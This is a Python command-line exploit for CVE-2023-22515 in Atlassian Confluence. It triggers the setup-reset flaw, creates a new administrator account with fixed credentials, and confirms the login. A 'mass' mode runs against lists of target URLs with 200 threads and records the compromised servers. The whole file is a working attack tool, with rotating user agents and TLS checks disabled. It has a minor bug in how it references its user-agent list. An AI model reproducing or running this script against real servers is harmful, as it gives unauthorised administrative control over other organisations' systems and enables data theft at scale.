import json
import click
import requests
import random
from rich import print

from alive_progress import alive_bar
from concurrent.futures import ThreadPoolExecutor

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)",
]

#HEADERS = {
#    "X-Atlassian-Token": "no-check",
#    "User-Agent": "insert random agent here from USER_AGENTS list",
#}

requests.packages.urllib3.disable_warnings()


class Confluence:
    def __init__(self, base_url, verbose=False, output_file=None):
        self.base_url = base_url
        self.verbose = verbose
        self.username = "pleasepatch"
        self.password = "Password2"
        self.output_file = output_file
        self.headers = self._get_random_header()

    # Function to get a header with a random user agent
    def _get_random_header(self):
        """Selects a random user agent and returns the headers dictionary."""
        random_agent = random.choice(self.USER_AGENTS)
        headers = {
            "X-Atlassian-Token": "no-check",
            "User-Agent": random_agent,
        }
        return headers

    def send_request(self, method, url, auth=None, data=None):
        try:
            response = requests.request(
                method,
                url,
                headers=self.headers,
                verify=False,
                timeout=3,
                auth=auth,
                data=data,
            )
            return response.status_code, response.text
        except requests.exceptions.RequestException as e:
            if self.verbose:
                print(f"[[bold red]ERROR[/bold red]] Request error for {url}: {str(e)}")
            return None, None

    def check_authentication(self):
        """Check authentication and retrieve user details."""
        self.headers = self._get_random_header()

        auth = (self.username, self.password)
        url = f"{self.base_url}/rest/api/user?username={self.username}"
        status, response = self.send_request("GET", url, auth=auth)

        if status == 200:
            try:
                user_info = json.loads(response.strip())
                formatted_user_info = json.dumps(user_info, indent=2)
                if self.verbose:
                    print(
                        f'[bold green][*][bold white] Authenticated as "{self.username}" user\n'
                    )
                    print(
                        f"[[bold yellow]INFO[/bold yellow]]  User Information: [white]{formatted_user_info}"
                    )
            except json.JSONDecodeError:
                return False

            return True
        else:
            if self.verbose:
                print(
                    f"[bold red][-][/bold red] Authentication failed on REST API for {self.username}"
                )

            return False

    def exploit(self):
        success_message = None

        if not self.trigger_vulnerability():
            error_message = f"[bold red][-][/bold red] Failed to trigger vulnerability for {self.base_url}"
        elif not self.create_admin_account():
            error_message = f"[bold red][-][/bold red] Failed to create a new administrator for {self.base_url}"
        elif self.check_authentication():
            success_message = f"[bold green][*][bold white] Successfully exploited {self.base_url} and logged in as admin!"
        else:
            error_message = f"[bold red][-][/bold red] Failed to authenticate with created admin account at {self.base_url}"

        if success_message:
            if not self.verbose:
                print(success_message)
            return success_message
        else:
            return error_message

    def trigger_vulnerability(self):
        status, _ = self.send_request(
            "GET",
            f"{self.base_url}/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false",
        )
        return status == 200

    def create_admin_account(self):
        data = {
            "username": self.username,
            "fullName": self.username,
            "email": f"{self.username}@localhost",
            "password": self.password,
            "confirm": self.password,
            "setup-next-button": "Next",
        }

        status, response = self.send_request(
            "POST", f"{self.base_url}/setup/setupadministrator.action", data=data
        )

        if status == 200:
            if self.verbose:
                print(f"[[bold yellow]INFO[/bold yellow]] Username: {self.username}")
                print(f"[[bold yellow]INFO[/bold yellow]] Password: {self.password}")

            if "Setup Successful" in response:
                if self.verbose:
                    print(
                        "[bold green][*][bold white] Created new administrator successfully"
                    )
                self.save_to_output_file()

            elif "A user with this username already exists" in response:
                if self.verbose:
                    print(
                        "[bold yellow][!][bold white] Administrator with this username already exists"
                    )
                self.save_to_output_file()

            else:
                if self.verbose:
                    print(
                        f"[bold red][-][/bold red] Failed to create a new administrator for {self.base_url}"
                    )

        return status == 200

    def save_to_output_file(self):
        if self.output_file:
            with open(self.output_file, "a") as file:
                file.write(
                    f"Vulnerable server: {self.base_url} | Username: {self.username} | Password: {self.password}\n"
                )


@click.group()
@click.option("--verbose", "-v", is_flag=True, help="Enable verbose mode")
@click.pass_context
def cli(ctx, verbose):
    """Exploit script for CVE-2023-22515 - Confluence Vulnerability."""
    ctx.ensure_object(dict)
    ctx.obj["verbose"] = verbose


@cli.command()
@click.argument("target")
@click.option("--output-file", "-o", help="File to save vulnerable servers")
@click.pass_context
def normal(ctx, target, output_file):
    """Exploit the Confluence vulnerability with a single target URL."""
    verbose = ctx.obj["verbose"]
    exploit_target(target, verbose=verbose, output_file=output_file)


@cli.command()
@click.argument("filename")
@click.option("--output-file", "-o", help="File to save vulnerable servers")
@click.pass_context
def mass(ctx, filename, output_file):
    """Exploit the Confluence vulnerability with a list of URLs from a file."""
    verbose = ctx.obj["verbose"]
    try:
        with open(filename, "r") as file:
            targets = [line.strip() for line in file.readlines() if line.strip()]
        scan_targets(targets, verbose=verbose, output_file=output_file)
    except FileNotFoundError:
        click.echo(f"Error: File '{filename}' not found.", err=True)
        raise click.Abort()


def scan_targets(targets, verbose=False, output_file=None):
    with alive_bar(len(targets), enrich_print=False) as bar:
        with ThreadPoolExecutor(max_workers=200) as executor:
            list(
                executor.map(
                    lambda url: exploit_target(url, bar, verbose, output_file), targets
                )
            )


def exploit_target(url, bar=None, verbose=False, output_file=None):
    Confluence(url, verbose=verbose, output_file=output_file).exploit()
    if bar:
        bar()


if __name__ == "__main__":
    cli(obj={})